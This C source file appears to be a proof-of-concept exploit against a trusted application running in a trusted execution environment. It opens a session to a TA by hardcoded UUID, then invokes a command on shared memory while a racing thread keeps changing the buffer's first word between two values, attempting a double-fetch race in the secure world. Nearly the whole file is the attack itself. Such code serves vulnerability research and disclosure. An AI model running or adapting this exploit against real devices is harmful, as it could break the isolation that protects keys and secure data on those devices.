#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void* mod_thread(void* arg){
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(1, &set);
    while(1){
        ((int*)arg)[0] = 0x1001;
        //((int*)arg2)[1] = 0x800;
        ((int*)arg)[0] = 0x1009;
        //((int*)arg2)[1] = 0x80002;

    }
}


void send_req(TEEC_Context *context, TEEC_Session *session)
{

    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);

    *(int*)mem_area1 = 0x100a;


	TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
    op.params[0].tmpref.size =  0x1000; 
    op.params[1].tmpref.buffer = mem_area2;  // the keyblock buffer
    op.params[1].tmpref.size =  0x1000; 
    uint32_t err_origin;

    pthread_t tid;
    if (pthread_create(&tid, NULL, mod_thread, mem_area1) != 0) {
        perror("pthread_create failed");
        return;
    } 

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
}


int main(int argc, char **argv)
{
    //char* ta = "df1edda8627911e980ae507b9d9a7e7d";
    char* ta = "93feffccd8ca11e796c7c7a21acb4932";
    unsigned char hex_b[0x40] = {0}; 
    hex2bytes(ta,hex_b);
    TEEC_Context context;
    TEEC_Session session;
    TEEC_UUID *uuid = (TEEC_UUID *)malloc(sizeof(TEEC_UUID));
    uint32_t timeLow;
    uuid->timeLow = (uint32_t)hex_b[0] << 24 |
      (uint32_t)hex_b[1] << 16 |
      (uint32_t)hex_b[2] << 8  |
      (uint32_t)hex_b[3];
    uuid->timeMid = (uint16_t)hex_b[4] << 8 | (uint16_t)hex_b[5];
    uuid->timeHiAndVersion = (uint16_t)hex_b[6] << 8 | (uint16_t)hex_b[7];
    for(int i = 0; i<8; i++){
        uuid->clockSeqAndNode[i] = (uint8_t)hex_b[8+i];
    }

    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
